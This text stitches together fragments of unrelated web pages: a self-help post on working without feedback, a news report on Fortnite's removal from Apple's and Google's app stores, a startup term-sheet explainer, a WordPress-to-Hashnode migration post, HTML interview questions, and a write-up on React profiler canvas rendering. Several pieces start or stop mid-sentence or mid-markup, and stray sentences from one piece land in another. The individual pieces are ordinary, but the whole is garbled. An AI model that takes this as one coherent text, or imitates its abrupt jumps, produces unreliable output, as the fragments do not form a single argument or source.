href="https://durmonski.com/book-summaries/ego-is-the-enemy/" target="_blank" rel="noreferrer noopener">your ego</a>, with something “better” hoping that you’ll get recognition.</p><p>That’s also the reason people indulge in <a aria-label=" (opens in a new tab)" href="https://durmonski.com/well-being/internet-rabbit-holes/" target="_blank" rel="noreferrer noopener">careless scrolling</a>. If the project you’re working on is not getting the desired traction you start to doubt your own existence. That’s why we enter the artfully curated social media feeds to feel good about ourselves and escape the harsh reality.</p><p>But here’s the interesting part: The more time you can bear working on a project without getting external feedback the higher the chances of this thing to thrive and succeed.</p><p>The same applies to your relationships. If you can endure the arguments and don’t seek comfort in other people’s arms (i.e. cheat), you have a chance in creating a long-lasting marriage.</p><p>It’s quite a paradox. Half of the brain is logging for positive feedback to feed the ego while the other half is trying to stay reasonable and sane even when the first is not present.</p><h2>Getting Positive Feedback is The Main Desire of The Brain</h2><p>But it’s not only projects and relationships. Our brain is constantly seeking for positive cues. After all, the core goal of the whole body system is to keep you alive, make you feel good so you can survive for a longer period of time and pass your genes along.</p><p>What does all of this mean for our long term goals?</p><p>That if you want to make some positive changes in your life it will surely require enduring through long periods that are absent of any feedback – in a lot of cases both good and bad.</p><p>Want to lose weight and add a nice six-pack to your abs? It might take you months of starvation and hard exercises. During this transition period, the guy who stares at you back in the mirror is still going to be fat and asymmetrical.</p><p>Want to create a profitable online business? Despite praying to Google to show your content a bit higher in the search results you also have to write extremely good essays over a long period of time.</p><p>But I’m not here only to warn you about the loneliness and the years of hard work without immediate return. I’m here to help.</p><p>Here’s what you can do to make your journey to what you want to become, create, or whatever, a bit more bearable…</p><h2>How Can You Cope With Not Getting Feedback For Your Project?</h2><h3>Create Visual Feedback Loops</h3><p>“Don’t break the chain!” said Jerry Seinfeld when asked how he was able to keep delivering amazing jokes to people around the world.<span id="easy-footnote-2-10677"></span><span><a href="#easy-footnote-bottom-2-10677" title="A lot of people call it <a href=&quot;https://jamesclear.com/stop-procrastinating-seinfeld-strategy&quot; target=&quot;_blank&quot; aria-label=&quot;The Seinfeld Strategy (opens in a new tab)&quot; rel=&quot;noreferrer noopener&quot; class=&quot;ek-link&quot;>The Seinfeld Strategy</a>."><sup>2</sup></a></span></p><p>He’s famous for his practice of writing jokes daily and checking off boxes on a calendar.</p><p>Jerry Seinfeld famously said, “Do something related to your craft every day, no matter how small the action is.”</p><p>That’s the first tactic that will help you cope with the lack of feedback when you want to create a business or adopt a new habit.</p><p>The idea is to create a visual representation of the progress you’re making.</p><figure><img width="1024" height="512" src="https://durmonski.com/wp-content/uploads/2020/08/Dont-break-the-chain-1024x512.jpg" alt="Don't-break-the-chain" srcset="https://durmonski.com/wp-content/uploads/2020/08/Dont-break-the-chain-1024x512.jpg 1024w, https://durmonski.com/wp-content/uploads/2020/08/Dont-break-the-chain-300x150.jpg 300w, https://durmonski.com/wp-content/uploads/2020/08/Dont-break-the-chain-770x385.jpg 770w, https://durmonski.com/wp-content/uploads/2020/08/Dont-break-the-chain-1536x768.jpg 1536w, https://durmonski.com/wp-content/uploads/2020/08/Dont-break-the-chain-566x283.jpg 566w, https://durmonski.com/wp-content/uploads/2020/08/Dont-break-the-chain-1151x575.jpg 1151w, https://durmonski.com/wp-content/uploads/2020/08/Dont-break-the-chain-1481x740.jpg 1481w, https://durmonski.com/wp-content/uploads/2020/08/Dont-break-the-chain-274x137.jpg 274w, https://durmonski.com/wp-content/uploads/2020/08/Dont-break-the-chain-751x376.jpg 751w, https://durmonski.com/wp-content/uploads/2020/08/Dont-break-the-chain-1381x691.jpg 1381w, https://durmonski.com/wp-content/uploads/2020/08/Dont-break-the-chain.jpg 2000w" sizes="(max-width: 1024px) 100vw, 1024px"></figure><p>Writing or exercising regularly is a good idea on paper, but you can easily lose motivation when you feel tired or when the weather outside is giving you blues.</p><p>Things feel quite different once you have a graph that’s showing your progress.

You don’t want to do that.</p><h3>Temper Your Emotions by Reminding Yourself Why You Started</h3><p>The reasons you started a project often fades after months or years of execution. You started because you wanted to make reading more available to others? Or, because you wanted to inspire more people to exercise?</p><p>Soon enough, though, you forget why your project exists.

Epic released the parody of Apple's famous '1984' television ad after Apple Inc. removed the game from its App Store for violating the company's in-app payment guidelines.<!-- --> <!-- -->(Epic Games/Reuters)</figcaption></figure><p><span><p>Apple Inc. and Alphabet Inc.'s Google on Thursday removed popular video game<em> Fortnite</em>&nbsp;from their app stores for violating the companies' in-app payment guidelines, prompting developer Epic Games to file federal antitrust lawsuits challenging the two companies' rules.</p>  <p>Apple and Google cited a direct payment feature rolled out on the Fortnite app earlier on Thursday as the violation.</p>  <p>Epic sued in U.S. court seeking no money from Apple or Google but rather injunctions that would end many of the companies' practices related to their app stores.</p>  <p>"Apple has become what it once railed against: the behemoth seeking to control markets, block competition, and stifle innovation. Apple is bigger, more powerful, more entrenched, and more pernicious than the monopolists of yesteryear," Epic said in its lawsuit, filed in the Northern District of California.</p>  <h2>Epic attacks Apple on social media</h2>  <p>Epic also attacked Apple on social media, launching a campaign with the hashtag #FreeFortnite, urging players to seek refunds from Apple if they lose access to the game, and creating a <a href="http://www.youtube.com/watch?v=euiSHuaw6Q4" target="_blank">parody</a> of Apple's famous <a href="http://www.youtube.com/watch?v=VtvjbmoDx-I" target="_blank">"1984"&nbsp;television ad</a>.</p>  <p>In the parody, which quickly garnered hundreds of thousands of views, a female <em>Fortnite </em>fighter hurls a unicorn-shaped club to smash a screen on which an Apple-headed character speaks of "the anniversary of the platform unification directives."</p>  <p><span><blockquote lang="en"><p>Epic Games has defied the App Store Monopoly. In retaliation, Apple is blocking Fortnite from a billion devices. &lt;br&gt;&lt;br&gt;Visit &lt;a href="https://t.co/K3S07w5uEk"&gt;https://t.co/K3S07w5uEk&lt;/a&gt; and join the fight to stop 2020 from becoming "1984" &lt;a href="https://t.co/tpsiCW4gqK"&gt;https://t.co/tpsiCW4gqK&lt;/a&gt;</p>&amp;mdash;<a href="https://twitter.com/FortniteGame/status/1294006412931223552">@FortniteGame</a></blockquote></span></p>  <p>Apple takes a cut of between 15 per cent&nbsp;and 30 per cent&nbsp;for most app subscriptions and payments made inside apps, though there are some exceptions for companies that already have a credit card on file for iPhone customers if they also offer an in-app payment that would benefit Apple. Analysts believe games are the biggest contributor to spending inside the App Store, which is in turn the largest component of Apple's $46.3 billion-US-per-year&nbsp;services segment.</p>  <p>In a statement, Apple said <em>Fortnite</em> had been removed because Epic had launched the payment feature with the "express intent of violating the App Store guidelines" after having had apps in the store for a decade.</p>  <p>"The fact that their [Epic]&nbsp;business interests now lead them to push for a special arrangement does not change the fact that these guidelines create a level playing field for all developers and make the store safe for all users," Apple said in a statement.</p>  <p>Google also removed<em> Fortnite</em> from its Play Store, but did not immediately respond to a request for comment on the lawsuit.</p>    <p>"However, we welcome the opportunity to continue our discussions with Epic and bring <em>Fortnite </em>back to Google Play," Google spokesperson&nbsp;Dan Jackson said in a statement. Jackson said Epic had violated a rule requiring developers to use Google's in-app billing system for products within video games.</p>  <p>Apple and Google were among the major American technology companies to come under anti-competition scrutiny in a hearing before lawmakers last month. During the hearing, Apple Chief Executive Tim Cook argued that Apple is not anti-competitive because it does not have majority market share in any markets where it operates, including mobile phones, where devices powered by Alphabet Inc's Android have greater market share.</p>  <p>Epic's lawsuit, however, argues that app distribution and in-app payments for Apple devices constitute their own distinct market for anti-competition purposes because Apple users rarely leave its "sticky" ecosystem, according to Epic's filing.</p>  <h2>Way forward unclear</h2>  <p>Epic's free-to-play battle-royal videogame <em>Fortnite</em>&nbsp;has reached massive popularity among young gamers since its launch in 2017, and competes with Tencent Holdings' <em>PlayerUnknown's Battlegrounds</em>.&nbsp;The title's removal from the App Store means that new players will not be able to download it and that existing players cannot receive updates, but the game should continue to work on devices where it is already installed.</p>  <p>The battle between the tech giants has many debating who exactly has been disadvantaged by their relationship so far, and who will benefit from the standoff in the end.&nbsp;</p>  <p>"I don't know who David or Goliath is in this case," Kristopher Alexander, a professor specializing in&nbsp;video games at Ryerson University, told CBC&nbsp;News.</p>  <p>Both Apple and Google stand to lose a significant revenue stream without the game in their app stores, Alexander said. At the same time,&nbsp;the speed with which Epic released their response video suggests they already knew what was going to happen.&nbsp;&nbsp;&nbsp;&nbsp;</p>  <p>"They're playing the game, pun intended, in their own gaming terms," Alexander said. "They're using <em>Fortnite&nbsp;</em>to illustrate a point."</p>    <p>Riley MacLeod, editor-at-large with video game news site Kotaku, also pointed to the seemingly strategic nature of Epic's lawsuit. In 2018, MacLeod explained, Epic launched its own PC gaming store, the Epic Games Store. That store then became a direct competitor of Steam, another prominent PC gaming store that charges roughly&nbsp;30 per cent of game sales — similar to Apple and Google.&nbsp;</p>  <p>"[Epic] has always said there should be more marketplaces, more competition, and more money for developers," MacLeod said. "I think, at the heart of it, this is sort of the next step in that&nbsp;crusade."</p>  <p>Both Alexander and MacLeod pointed to the possibility of the stand-off shifting how video games are sold and profited from.

<p>Termsheets are (1) used by founders raising capital and (2) investors looking to deploy capital. Most all termsheets are different in some slight way (unless you’re using a&nbsp;<a target="_blank" href="https://www.ycombinator.com/documents/" rel="noreferrer noopener">SAFE</a>&nbsp;or&nbsp;<a target="_blank" href="https://500.co/blog/kiss/" rel="noreferrer noopener">KISS</a>&nbsp;note), they usually require lawyers, and all are time-consuming where neither party usually gets 100% of what they want. For a founder, it’s about obtaining capital without giving up too much control of their company, and for an investor, it’s about both how much control they can obtain and what the economic upside looks like. If you’re a founder, it’s best to get legal representation when executing these financings and understand what levers can be pulled with preferred stock. It’s also important to pick your fights when negotiating: for example, ask yourself if you care about registration rights more-so than liquidation preferences and which terms you want to put effort into.</p>



<p>I wanted to cover some of the main sections a term sheet, why it matters, and an example as a founder.</p>



<p>Please note that there are many pieces I won’t cover below: voting rights, option plans, key person insurance, piggyback rights, asset purchase rights (M&amp;A), drag-along rights, and voting thresholds to name a few. One great way to familiarize yourself with termsheets is just to read a dozen of them in a similar place you’re operating at. You’ll be able to google your way to them. I’ll also put some books and template material at the end of this post since there are a lot of great resources are out there to get educated on the topic.</p>



<h2>Terms and their meanings (in no particular order):</h2>



<h3>The Round:</h3>



<ul><li>Normal rounds follow these titles: pre-seed (otherwise known as soil or angel), seed, series-A, series-B, C, D, E, F (etc.) to IPO, acquisition, or continuing to stay private. The amount of capital varies widely depending on the industry the company is in, the opportunity at hand, the current marketplace, and wouldn’t be fair to talk about a template. For example,&nbsp;<a target="_blank" href="https://techcrunch.com/2020/06/16/outreach-nabs-50m-at-a-1-33b-valuation-for-its-sales-engagement-tools/" rel="noreferrer noopener">Outreach</a>&nbsp;(CRM tech) closed a series-F round of $50m at a $1.3bn valuation while&nbsp;<a target="_blank" href="https://news.crunchbase.com/news/chinas-face-raises-750m-for-facial-recognition/" rel="noreferrer noopener">Megvii</a>&nbsp;(deep learning) closed a series-E round of $750m at a $4bn valuation. It quickly becomes alphabet soup and somewhat meaningless.<ul><li><strong>Example: we’ll do a series-A round</strong>&nbsp;<strong>in this example</strong></li></ul></li></ul>



<h3>Amount raising:</h3>



<ul><li>After understanding how much cash on the balance sheet you want over the next 24 months, you’ll need to understand what you have in the bank currently and what amount of revenue you can expect. The gap should be targeted as your round (with some buffering for safety). You’ll likely include your pre-money valuation (for this purpose lets say it was at $10m).<ul><li>For example, after calculating you believe you’ll need $4,500,000, but want some cushion in your balance sheet and a buffer if landing clients take another month or two, so you raise $5,000,000.</li></ul></li><li>Understand that the investors will want preferred stock. You’ll need to choose the aggregate number of shares to be sold and at what price: for example, 2.5m shares at $4 per share.<ul><li>Typically your price per share is the pre-money valuation divided by the fully-diluted shares outstanding. Fully-diluted should mean that it’s the number of all outstanding stock on an as-converted basis (common, preferred, and even warrants or convertible securities).</li></ul></li><li>Understand the type of payment – and that it’s cash you want.</li><li>You’ll also want to do some due diligence into what other rounds have happened and what they’ve looked like for other private companies. Some reports on this get published from Pitchbook to&nbsp;<a target="_blank" href="https://www.wsgr.com/images/content/2/8/28110/EntrepreneursReport-1H-2020.pdf" rel="noreferrer noopener">Wilson Sonsini’s</a>&nbsp;quarterly financing trend report.<ul><li><strong>Example: we’ll raise $5m on $10m pre-money&nbsp;</strong></li></ul></li></ul>



<h3>Warrants:</h3>



<ul><li>Warrants will either be issued or not (binary). A warrant will grant the holder an option to purchase shares at a particular price during a chosen duration. These would increase in value as the underlying share increases with the&nbsp;<a target="_blank" href="https://www.investopedia.com/articles/investing/071513/warrants-and-call-options.asp#:~:text=Warrants%20and%20Call%20Options%20Similarities&amp;text=Strike%20price%20or%20exercise%20price,term%20with%20reference%20to%20warrants." rel="noreferrer noopener">exercise price</a>. You may structure warrants in your series A financing for an investor to sweeten the deal: for example, you expect your company to grow 75% YoY and the investor you want to be on your cap-table plans to help your company grow, thus wanting the option to get a higher percentage of the company in another 18 months. This is where warrants would come in. Conversely, as a founder you may not want to issue warrants given the cap-table you want to have, the control you desire, the funds you need, or the need to at all.<ul><li><strong>Example: we will have no warrants</strong></li></ul></li></ul>



<h3>Dilutive Financing:</h3>



<ul><li>You’ll need to choose with the next round investors if the financing will be dilutive to the existing capitalization structure in your company beyond the issuance of the new shares. Sometimes there will be a pay-to-play provision where investors must continue to invest or become diluted, or even harsher where current preferred holders must convert to common shares. The latter will require negotiations and be time-consuming.</li><li>Depending on if your company has been increasing in value, or decreasing, the investors may want it to be dilutive and to restructure the capital structure. For example, if the company has decreased since earlier rounds (your soil and seed round) then they may want it to be dilutive and have a ‘wash-out’ event. This usually wouldn’t happen for a series A, but could in later rounds.<ul><li><strong>Example: we will not have dilutive financing beyond the issuance of new preferred shares</strong></li></ul></li></ul>



<h3>Preferred Stock Rights – Liquidation Preference:</h3>



<ul><li>Liquidation preference – a very important topic – comes into play when the company has an event either along the lines of going out of business or a sale of the company. As a founder, you’ll have common stock and your investors are likely to all hold preferred (remember this). You game planning is important, as IPOs frankly don’t matter in these situations as it wouldn’t come into play. But the likelier scenario is that your company is purchased in the middle-market, where liquidation preference matters.<ul><li>It’s likely that the terms will be senior-to-common and would be a bit rare if preferred did not have a preference over common.</li></ul></li><li>The first point of negotiation will be around ‘purchase price’ or a multiple of that. The most common occurrence will be equal to the purchase price. But some investors may perceive the investment to be risker, asking for a multiple (say of 2x). If you have it at purchase price, it’ll reassure the investors that they’ll at least get their money back before amounts are distributed to common stockholders<ul><li><strong>Example: liquidation rights @ purchase price</strong></li></ul></li><li>The second point of negotiation is ‘participation right’. Which can be seen by some as investors ‘double-dipping’. For example, with non-participating, the investors holding preferred shares would only receive their liquidation preference (noted above, where our ‘takeaway was the purchase price’). The remaining would go to the common stockholders. But if investors have participation rights, they would normally receive an additional amount after the liquidation preference is paid out. This could be structured when a later stage company raises a financing round and expect to be sold in the next 12 months given their new investors want to ensure they can receive a premium on the capital deployed.</li><li>There will usually be an amount in multiple fashions. Normal levels are 1.5-3 depending on the round, company, and investors. For what it’s worth in today’s market, 3 is very aggressive, and depending on the situation, 2x can be as well.<ul><li><strong>Example: participation rights capped at 2x.</strong></li></ul></li></ul>



<h3>Preferred Stock Rights – Conversion to Common:</h3>



<ul><li>Normally the number preferred shares convert to common shares is a 1:1 basis. There are some important rights to holders of preferred shares, and one of them is the ability of the holder to convert to common stock of their choosing. Holders of preferred may choose to convert their shares to common stock if after calculating they’d receive more capital back than just receiving both their liquidation and participation preferences.<ul><li><strong>Example: conversation to common is 1:1</strong></li></ul></li></ul>



<h3><strong>Preferred Stock Rights – Anti-dilution</strong>:</h3>



<ul><li>As we talked about above with dilution from the next rounds, investors will likely want protection and will request it. The normal term will be set on a weighted average (broad-based). Weighted averages are the most common and take into consideration the new financing and the number of already outstanding shares. Broad-based takes into account all shares into the average, where a narrow-based usually doesn’t consider options, warrants, or notes. Investors would likely want a narrow-based weighted average given the total pool being calculated.</li><li>Full-ratchet. This is not used as much any longer (similar to ROFRs). But the term takes into account a conversion to reflect the new lower price of the issued securities and does not take into account the number of shares to be issued or outstanding. Full-ratchet provisions are much more dramatic than the broad or narrow-based weighted average options.<ul><li><strong>Example: broad-based weighted average</strong></li></ul></li></ul>



<h3><strong>Preferred Stock Rights – Redemption Rights</strong>:</h3>



<ul><li>It’s not normal for an investor to act on their redemption rights, but investors look to see a return on their invested capital. If that doesn’t happen (there’s no liquidity event in sight), this could be an outlet for them. It’s important to note that this could hurt your company because it may not have the cash on hand to pay and could be used as leverage by the investors to influence the founders’ decisions. It’s considered founder-friendly if you don’t have them and is a binary decision (yes or no).<ul><li><strong>Example: none</strong></li></ul></li></ul>



<h3><strong>Preferred Stock Rights – Dividends</strong>:</h3>



<ul><li>Dividends are usually not paid out and in normal circumstances only be allowed to be paid out if is declared by your board. The percentage is usually a percentage of the purchase price and reflects some points above the prime rate. It’s not uncommon to see a range between 8-12%. Additionally, dividends are usually not cumulative; meaning they don’t accrue and accumulate whether or not declared by the …</li></ul></div></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1597313376856/yGQnQpTIu.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text">

<p>If you are following me on Twitter, chances are you already know I migrated my blog from WordPress to Hashnode. The tweet below shows my announcement of moving to Hahshnode:</p>

<p>Therefore, in this article, I want to shine some light on why I chose to leave WordPress, and become part of the <a href="https://hashnode.com/@hashnode">Hashnode</a> community.</p>

<p>As you might know, or not, I am a big fan of WordPress. The reasons are that:</p>
<ul>
<li>it is easy to use</li>
<li>it is free</li>
<li>there are lots of free themes available</li>
<li>there are integrations with almost any service available on the internet</li>
</ul>
<p>... and many more.</p>
<p>However, it can be very bloated, slow, and overkill for a technical blog. For instance, to add code snippets to my articles, I had to install a special plugin. Then, every time I wanted to add a code snippet to an article, I had to:</p>
<ol>
<li>go to the plugin settings</li>
<li>select the language of the code snippet</li>
<li>create a name and a description for the snippet</li>
<li>choose a tag</li>
<li>write the code</li>
<li>save the snippet</li>
<li>embed the snippet into the article</li>
</ol>
<p>Thus, to add a snippet of code, I need to follow seven steps. Now let us say I have to embed five code snippets. As a result, I have to do thirty-five extra steps! Moreover, I did not have any control over my snippets, and I could not customise the design. </p>
<p>Anyway, the above is just an example to show you laborious some tasks can be in WordPress. I decided enough is enough, and I started to look for alternatives, as shown by the tweet below. </p>


<p>I believe there is not the best alternative because everyone has different needs and use cases. However, for my use case, I had to choose between:</p>
<ol>
<li>Hashnode</li>
<li>Gatsby + MDX</li>
</ol>
<p>Even though I love Gatsby blogs, and the level of customisation they allow, it can be very time-consuming to create such a blog. And then you have to maintain it too. Therefore, the only option left was Hashnode.</p>
<h3 id="why-hashnode-">Why Hashnode?</h3>
<p>The thing that attracts me the most to Hashnode is that it combines both worlds of a dynamic blog like a WordPress blog and a static site like a Gatsby blog. It has more features than a static blog, but it is less-bloated than a WordPress blog. </p>
<p>Besides that, you get to be part of an awesome and fantastic community. It is one of the most supportive communities I have ever been involved in, and they do not pay me to say this. It is my opinion. </p>
<p>Other reasons why I prefer Hashnode:</p>
<ul>
<li><strong>AMP pages</strong> =&gt; The blog is very fast on mobile, and poor internet.</li>
<li><strong>Publishing articles is swift and easy</strong> =&gt; You write your articles in Markdown. Also, you can easily embed YouTube videos, tweets, content from other sites, and so on. </li>
<li><strong>Free SSL certificate</strong> =&gt; How cool is that? You do not have to pay anything for the certificate.</li>
<li><strong>Your domain</strong> =&gt; You can use your domain for your blog. You are not tied to a blog URL like <code>pit.hashnode.dev</code>.</li>
<li><strong>Back up your articles on GitHub</strong> =&gt; Do you want to migrate to another platform? Well, you are not locked on Hashnode. They provide you with the opportunity of backing up your articles on GitHub in a JSON format. As a result, you can switch platforms without losing your content.</li>
<li><strong>I can talk straight to the founders</strong> =&gt; How cool is that I can speak straight with the people that founded the platform? I cannot do this with WordPress, Dev To, Medium, and other platforms. If I have feedback or ideas, I can pitch them. (<em>that does not mean I bother them all day long</em>)</li>
<li><strong>Discord server</strong> =&gt; I already said that they have a great, tight, supportive community. Thus, they have an exclusive Discord server with all the people using Hashnode, including the founders. You can exchange ideas, ask questions, and many more. Check it out! </li>
</ul>
<p>In conclusion, these are the reasons why I choose to use and become part of the Hashnode community. If you have other good reasons, feel free to drop them in the comments.</p>

<p>I hope the article makes it clear why I chose Hashnode and why it can be an excellent choice for anyone. I want to emphasise again that I did not get paid to move to Hashnode or write this article. </p>
<blockquote> If you enjoyed the article, consider sharing it so more people can benefit from it! Also, feel free to @ me on Twitter with your opinions. </blockquote>

<p><span>In this article, we
will see some HTML interview questions I faced during interviews.<br>
So let's start,<p>

<b>1)What is Doctype in html?</b><br>
All HTML documents must start with a &lt;!DOCTYPE&gt; declaration.<br>
The declaration is not an HTML tag. It is an "information" to the
browser about what document type to expect.<br>
In HTML 5,<br>
the declaration is simple:<br>
&lt;!DOCTYPE html&gt;</p><p>

<b>Note:</b>The &lt;!DOCTYPE&gt; declaration is NOT case sensitive.</p><!--[if !supportLineBreakNewLine]--><br>
<!--[endif]--><o:p></o:p></span></p>
<p><b><span>2)What is DOM in html?<o:p></o:p></span></b></p>
<p><span><span>The DOM (Document Object Model)is a W3C (World Wide Web Consortium)
standard.<br>
The DOM defines a standard for accessing documents:<br>
The HTML DOM is a standard object model and programming interface for
HTML.<br>
When a web page is loaded, the browser creates a Document Object Model of the
page.<br>
It defines:<br>
The HTML elements as objects<br>
The properties of all HTML elements<br>
The methods to access all HTML elements<br>
The events for all HTML elements<br>
In other words:<br>
The HTML DOM is a standard for how to get, change, add, or delete HTML
elements.<!--[if !supportLineBreakNewLine]--><br>
<!--[endif]--></span><span><o:p></o:p></span></span></p>
<p><b><span>3)What are the new features in html5?<o:p></o:p></span></b></p>
<p><span><span><br>
<b>The doctype:</b>&nbsp;You need not write down a long and messy doctype tag.
Just type &lt;!DOCTYPE html&gt; and you are good to go.<p>

<b>The charset:</b>&nbsp;To display an HTML page correctly, a web browser must
know which character set to use. The default character set for HTML5 is UTF-8,

<p>This summer, I have been working on an experimental <a href="https://react-scheduling-profiler.vercel.app/">React concurrent mode profiler</a> as part of the inaugural batch of the <a href="https://fellowship.mlh.io/">MLH Fellowship</a>. One of the biggest engineering challenges I had was to optimize our canvas rendering.</p><p>This was no small task. A single 10-second profile can have over 100,000 flame chart stack frames, along with hundreds of React data elements. Since users can interact with their profiles by hovering, panning, and zooming into the data, our rendering code had to be efficient to avoid a janky experience.</p><figure><img src="https://blog.eliangtan.com/content/images/2020/08/image-4.png" alt="" srcset="https://blog.eliangtan.com/content/images/size/w600/2020/08/image-4.png 600w, https://blog.eliangtan.com/content/images/size/w1000/2020/08/image-4.png 1000w, https://blog.eliangtan.com/content/images/2020/08/image-4.png 1192w"><figcaption>Screenshot of React concurrent mode profiler showing a hover over a render phase segment spanning 2 entangled Fiber lanes</figcaption></figure><h2 id="the-before-state">The "before" state</h2><p>Our project was forked from an <a href="https://github.com/bvaughn/scheduling-profiler-prototype">early prototype</a> that Brian Vaughn of the React core team built in late 2019. Brian's prototype already included these optimizations:</p><ol><li>It did not use any abstraction layers. During React's commit phase, a long function would loop through the data and draw to the canvas. We were thus confident that there were no inefficiencies apart from those in our code.</li><li>Elements that are offscreen or narrower than 1 pixel were not rendered. This limited the number of calls to the slow <a href="https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API">Canvas API</a>.</li></ol><p>Unfortunately, these optimizations weren't enough. When a significant number of elements were on screen, interactions stuttered noticeably as frame rates dropped to 20 FPS or less. Although the app was still very usable, this experience was less than ideal. We wanted to fix it.</p><p>In this post, I’ll bring you through my journey getting to a solution that improves our product’s UX. You can also find more information and discussions in our <a href="https://github.com/MLH-Fellowship/scheduling-profiler-prototype/issues/50">GitHub issue</a>!</p><h2 id="the-problem-broken-down-further">The problem, broken down further</h2><p>Before we begin, we must first locate the biggest areas of improvement so that our solutions will have the largest impact.</p><p>First, I turned to Chrome DevTools's performance tab to profile some interactions. The profiles told us that our flame chart rendering was the slowest part of each animation frame by far. This matched my expectations, as we had many more flame chart nodes than React data elements.</p><figure><img src="https://blog.eliangtan.com/content/images/2020/08/image-6.png" alt="" srcset="https://blog.eliangtan.com/content/images/size/w600/2020/08/image-6.png 600w, https://blog.eliangtan.com/content/images/size/w1000/2020/08/image-6.png 1000w, https://blog.eliangtan.com/content/images/2020/08/image-6.png 1448w" sizes="(min-width: 720px) 720px"><figcaption>A comparison of how long <code>renderFlamechart</code> took compared to the other <code>render*</code> functions.</figcaption></figure><p>The profiles also provided further evidence that full-canvas renders were already very efficient. Most of the execution time was spent in the green boxes—canvas API calls.</p><p>Second, I realized it was unnecessary to render the whole canvas on every interaction. Specifically, when the user hovers over the canvas, we only need to redraw when:</p><ul><li>The cursor enters a flame chart frame or React event/measure: we want to show that they're hovered by changing their background color.</li><li>The cursor exits the frame/event/measure: we want to render the normal background color for the exited element.</li></ul><p>Because profiles often have tiny elements, they may only appear for a fraction of a second as a user skims their cursor over them. If our profiler has a low frame rate on hover, they may not even appear at all! This made it essential to optimize hovers. Everyone hunting for that one tiny function call in their profiles, you're welcome.</p><ol><li>Further decreasing the number of elements rendered. This was not possible. In fact, we'd want to render <em>more </em>flame chart frames, so that we don't have to hide narrow ones.</li><li>Pre-rendering things on an offscreen canvas. Unfortunately, this is only helpful if we can predict what the next frame will be. Since we are rendering in response to user input, this was also not possible.</li></ol><h2 id="solutions-tried-but-ruled-out">Solutions tried but ruled out</h2><h3 id="using-reactart">Using <a href="https://github.com/facebook/react/blob/master/packages/react-art/README.md">ReactART</a></h3><p>Interestingly, React has an official renderer that renders to HTML canvasses: ReactART. Since React will only commit changes and leave everything else untouched, this sounded exactly like the droid we were looking for!</p><p>Sadly, there were significant problems with ReactART:</p><ol><li>The biggest issue was that React was not performant enough to work with the number of elements we needed. In the screenshot below, you can see that React spends a lot of time in the reconciliation phase. We could not afford this overhead in our profiler.</li><li>Our profiler renders many rectangles. As luck would have it, ReactART's constructed rectangles by adding straight line segments to a path—a slow process. Even though I forked ReactART and its underlying Art library to optimize this, performance profiles still showed that a lot of time was somehow spent in <code>setTransform</code> calls.</li><li>ReactART is not very well maintained. I didn't think this was a big concern, since our profiler will be part of the React project too and would thus provide an incentive to maintain ReactART.</li></ol><figure><img src="https://blog.eliangtan.com/content/images/2020/08/image-5.png" alt="" srcset="https://blog.eliangtan.com/content/images/size/w600/2020/08/image-5.png 600w, https://blog.eliangtan.com/content/images/size/w1000/2020/08/image-5.png 1000w, https://blog.eliangtan.com/content/images/2020/08/image-5.png 1564w" sizes="(min-width: 1200px) 1200px"><figcaption>Chrome DevTools Performance tab flame chart of a render frame with ReactART</figcaption></figure><p>So, although it would have been nice to use ReactART (and it has a nice API too!), I ultimately decided against it as there were too many problems.</p><h3 id="using-webgl-with-pixi-js-and-two-js">Using WebGL with Pixi.js and Two.js</h3><p>A friend (who works on the amazing <a href="https://mobbin.design/">Mobbin</a>) suggested that I try using WebGL next. Because WebGL's native APIs are powerful and equally hard to use, it is only a viable option if used with an abstraction layer.</p><p>He recommended that I try the Pixi.js library. Unfortunately, performance got even worse than before, even with Brian's optimizations present. I also tried Two.js with similar results.</p><p>Because I was not familiar with WebGL or Pixi.js, continuing with it could delay or even derail the project. I decided that pursuing a WebGL approach would be too risky.</p><p>Later, I found out that Pixi.js can <a href="https://www.goodboydigital.com/pixijs/bunnymark/">handle</a> a hundred thousand sprites at 20+ FPS. Plus, it looks like both Chrome DevTools and <a href="https://www.speedscope.app/">Speedscope</a> use WebGL to render their flame graphs. I suspect I did not use WebGL as effectively as I could. I should try this again!</p><h2 id="a-view-framework">A view framework?</h2><p>When I was thinking about solutions to this problem, I had the wild idea to implement UIKit's <a href="https://developer.apple.com/documentation/uikit/uiview"><code>UIViews</code></a> in JavaScript. Apple recommends the model-view-controller pattern in iOS apps, and <code>UIViews</code> are the foundation of the view layer. In a native iOS app, literally everything you see will be an instance of a <code>UIView</code> or one of its subclasses.</p><p>Having worked on iOS apps starting about 11 years ago, I was familiar with the view system on iOS. Here's what I liked about its API:</p><ol><li><code>UIViews</code> efficiently drew areas that needed drawing with a <a href="https://developer.apple.com/documentation/uikit/uiview/1622529-drawrect?language=objc"><code>drawRect:</code></a> method.</li><li><code>UIViews</code> have a <code>needsDisplay</code> flag that is set to true when the view's contents are invalidated. This allows UIKit to only draw views that need drawing.</li><li>The <code>UIView</code> class can be subclassed to implement custom drawing and handle interactions.</li><li>Behaviors can be composed by nesting <code>UIViews</code>. This is how <code>UIScrollView</code>, <code>UIStackView</code> and many other views work.</li><li>The <a href="https://developer.apple.com/documentation/coregraphics/cgcontext"><code>CGContext</code></a> API formed the basis for JavaScript Canvas APIs. This gave me confidence that a <code>UIView</code>-like API will work well with JS's Canvas.</li></ol><p>If we had such a view framework in JavaScript, interactions that don't need the whole canvas to be redrawn will be easy to implement in a performant way. This means that the view framework will only optimize hover interactions. Scroll and zoom performance will remain roughly unchanged in the current app.</p><p>A view framework will also resolve other issues in our profiler:</p><ol><li>Our interaction code was independent from the rendering code. Interaction handling code was forced to recalculate the layout of the elements onscreen. This was annoying as we had to implement any layout changes twice. More importantly, subtle differences in layout calculations resulted in unexpected bugs in the UI.</li><li>Brian's optimizations were duplicated in the multiple render functions. Ideally, any optimizations should be applied automatically so that our rendering is optimal by default.</li></ol><p>Because of my experience with UIKit, I was confident that a view framework will address these issues.</p><p>The big downside is that we have to implement and maintain a framework. All frameworks incur a certain cost for the benefits they provide, and this was no different. I won't lie, I was very hesitant to do this. A view framework like this is also not common in the JavaScript world, and would be an extra barrier for any potential contributor to overcome.</p><p>You could also argue that such an API is antiquated, and declarative APIs like React are the future. In fact, one of React's predecessors at Facebook was a similar framework called UIComponent (see <a 